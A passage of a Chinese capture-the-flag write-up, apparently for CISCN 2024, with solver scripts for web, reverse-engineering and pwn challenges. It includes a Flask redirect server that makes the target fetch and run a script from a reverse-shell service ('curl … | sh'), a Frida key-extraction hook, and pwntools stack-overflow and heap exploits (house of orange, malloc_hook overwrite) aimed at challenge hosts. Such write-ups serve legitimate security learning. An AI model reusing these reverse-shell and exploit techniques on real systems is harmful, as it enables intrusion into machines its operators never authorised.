class="hljs-variable">$url</span>,<br>            <span class="hljs-string">&#x27;Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3&#x27;</span>,<br>        ));<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_USERAGENT,<span class="hljs-string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13)Gecko/20080311 Firefox/2.0.0.13&#x27;</span>);<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>总共会请求两次，第一次的时候返回真实图片就好了，第二次再重定向到127.0.0.1</p><p><img src="/img/wp/2024/2024ciscn-easycms_revenge-1.png"></p><p>根据条件修改flask中的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br>counter = <span class="hljs-number">0</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> counter<br><br>    <span class="hljs-keyword">if</span> counter == <span class="hljs-number">0</span>:<br>        counter += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;img.png&#x27;</span>, mimetype=<span class="hljs-string">&#x27;image/png&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> counter == <span class="hljs-number">1</span>:<br>        counter = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>反弹shell后执行readflag</p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h2><p>ida上扣下来的arm汇编代码，丢给gpt翻译一下得到加密逻辑，爆一下就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">lst = [<span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x21b7</span>, <span class="hljs-number">0x1e47</span>, <span class="hljs-number">0x2027</span>, <span class="hljs-number">0x26e7</span>,<br>       <span class="hljs-number">0x10d7</span>, <span class="hljs-number">0x1127</span>, <span class="hljs-number">0x2007</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x1e47</span>,<br>       <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x11f7</span>, <span class="hljs-number">0x2007</span>, <span class="hljs-number">0x1037</span>,<br>       <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x1f17</span>, <span class="hljs-number">0x10d7</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x1017</span>,<br>       <span class="hljs-number">0x1f67</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x1017</span>,<br>       <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1f17</span>, <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x0f47</span>, <span class="hljs-number">0x1127</span>,<br>       <span class="hljs-number">0x1037</span>, <span class="hljs-number">0x1e47</span>, <span class="hljs-number">0x1037</span>, <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1107</span>,<br>       <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x2787</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>        <span class="hljs-keyword">if</span> (((j * <span class="hljs-number">0x50</span>) + <span class="hljs-number">0x14</span>) ^ <span class="hljs-number">0x4D</span>) + <span class="hljs-number">0x1e</span> == lst[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span><br></code></pre></td></tr></table></figure><h2 id="androidso-re"><a href="#androidso-re" class="headerlink" title="androidso_re"></a>androidso_re</h2><p>有两个native函数用来获取key和iv，直接frida hook一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> jni = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>  jni[<span class="hljs-string">&quot;getkey&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getkey is called`</span>);<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;getkey&quot;</span>]();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getkey result=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br><br>  jni[<span class="hljs-string">&quot;getiv&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getiv is called`</span>);<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;getiv&quot;</span>]();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getiv result=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>得到key&#x3D;A8UdWaeq,iv&#x3D;Wf3DLups，加密方式为DES-CBC</p><p><img src="/img/wp/2024/2024ciscn-androidso_re-1.png"></p><p>厨子解一下就好了</p><p><img src="/img/wp/2024/2024ciscn-androidso_re-2.png"></p><h2 id="whereThel1b"><a href="#whereThel1b" class="headerlink" title="whereThel1b"></a>whereThel1b</h2><p>输入随机字符观察加密后的数据，每三位加密得到4位数据，猜是base64，直接爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> whereThel1b<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> hexdigits<br><span class="hljs-keyword">import</span> itertools<br>hexdigits += <span class="hljs-string">&quot;lg&#123;&#125;-&quot;</span><br>combinations = [<span class="hljs-string">&#x27;&#x27;</span>.join(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(hexdigits, repeat=<span class="hljs-number">3</span>)]<br><br>encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>, <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br><br>flag = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&quot;flag&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">14</span>):<br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>        flag[i*<span class="hljs-number">3</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">3</span>] = combo.encode()<br>        ret = whereThel1b.trytry(flag)<br><br>        <span class="hljs-keyword">if</span> ret[i*<span class="hljs-number">4</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>] == encry[i*<span class="hljs-number">4</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>]:<br>            <span class="hljs-built_in">print</span>(flag.decode())<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;</span><br></code></pre></td></tr></table></figure><h2 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h2><p>伪随机数，从当前时间往前爆破seed解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;time.h&gt;</span><br><br><br>unsigned char key[<span class="hljs-number">38</span>] = &#123;<br>    <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x88</span>,<br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4D</span>,<br>    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x78</span><br>&#125;;<br><br>void dump_data(unsigned char* data, size_t size, <span class="hljs-built_in">int</span> <span class="hljs-built_in">type</span>) &#123;<br>    <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>    &#123;   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>)<br>            printf(<span class="hljs-string">&quot;%c&quot;</span>, data[i]);<br>        <span class="hljs-keyword">else</span><br>            printf(<span class="hljs-string">&quot;%d,&quot;</span>, data[i]);<br>    &#125;<br>    printf(<span class="hljs-string">&quot;\n\n&quot;</span>);<br><br>&#125;<br><br>void brute_force() &#123;<br>    size_t length = <span class="hljs-number">38</span>;<br>    unsigned char enc_data[] = <span class="hljs-string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;<br>    unsigned char result[<span class="hljs-number">40</span>], shuffled_result[<span class="hljs-number">40</span>], final_result[<span class="hljs-number">40</span>];<br>    unsigned char shuffle_table[<span class="hljs-number">40</span>];<br><br><br>    unsigned char xor_key1[<span class="hljs-number">38</span>];<br>    unsigned char xor_key2[<span class="hljs-number">38</span>];<br><br>    unsigned <span class="hljs-built_in">int</span> current_time = <span class="hljs-number">1715788800</span>;//(unsigned <span class="hljs-built_in">int</span>)time(NULL);<br>    printf(<span class="hljs-string">&quot;current time: %d\n&quot;</span>, current_time);<br><br>    <span class="hljs-keyword">for</span> (unsigned <span class="hljs-built_in">int</span> seed = current_time; seed &gt;= <span class="hljs-number">0</span>; --seed) &#123;<br>        srand(seed &amp; <span class="hljs-number">0xF0000000</span>);<br><br>        // 异或<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            xor_key1[i] = rand();<br>        &#125;<br><br>        // 生成表<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            shuffle_table[i] = i;<br>        &#125;<br><br>        // 打乱表<br>        <span class="hljs-keyword">for</span> (size_t k = length - <span class="hljs-number">1</span>; k; --k) &#123;<br>            size_t rand_idx = rand() % (k + <span class="hljs-number">1</span>);<br>            unsigned char temp = shuffle_table[k];<br>            shuffle_table[k] = shuffle_table[rand_idx];<br>            shuffle_table[rand_idx] = temp;<br>        &#125;<br><br><br>        // 异或<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            xor_key2[i] = rand();<br>        &#125;<br><br>        // ---------------------------------------------------<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            final_result[i] = enc_data[i] ^ key[i];<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            final_result[i] ^= xor_key2[i];<br>        &#125;<br><br>        // 恢复打乱的数据<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            shuffled_result[shuffle_table[i]] = final_result[i];<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            result[i] ^= xor_key1[i];<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ( result[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;f&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;l&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;a&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;g&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>            dump_data(result, <span class="hljs-number">38</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">int</span> main() &#123;<br>    printf(<span class="hljs-string">&quot;magic........\n&quot;</span>);<br>    brute_force();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><p>func3中存在栈溢出，构造payload，但要小心rbp-0xc8与rbp-0xd0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p=process(&quot;./gostack&quot;)</span><br>p=remote(<span class="hljs-string">&quot;8.147.133.9&quot;</span>,<span class="hljs-string">&quot;39706&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./gostack&quot;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0x4C0995</span>)+p64(<span class="hljs-number">0x1c8</span>)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>+p64(<span class="hljs-number">0x4a0af6</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;message :&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><p>free时存在uaf，edit时允许溢出8字节，使用house of orange将top chunk放进unsorted bin，即可获取libc地址<br>修改malloc_hook为gadget即可获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">count,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    pause()<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(count).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">count,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content&#x27;</span>,<span class="hljs-built_in">str</span>(count).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content&#x27;</span>,data)<br>    pause()<br><br>libc=ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;8.147.131.196&quot;</span>,<span class="hljs-string">&quot;32607&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./orange_cat_diary&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;rotwill&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x1001</span>-<span class="hljs-number">0x70</span>)[:-<span class="hljs-number">1</span>])<br>add(<span class="hljs-number">0x1000</span>)<br>add(<span class="hljs-number">0x68</span>)<br><span class="hljs-comment">#edit(0x60,b&#x27;a&#x27;*0x58+b&#x27;rotwilll&#x27;)</span><br>show()<br>p.readuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-<span class="hljs-number">0x3c510a</span><br>malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>gadget=libc.address+<span class="hljs-number">0xf03a4</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>free()<br>edit(<span class="hljs-number">8</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(gadget))<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-string">&quot;123&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="easybuf"><a href="#easybuf" class="headerlink" title="easybuf"></a>easybuf</h2><p>赛后出的</p><p>一个使用了protobuf的菜单题，只能申请0x30字节的chunk，输出的超过三次会关闭输出句柄，不过释放时存在uaf，所以可以利用fast bin构造tcache bin中的double free，之后就可以任意地址写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 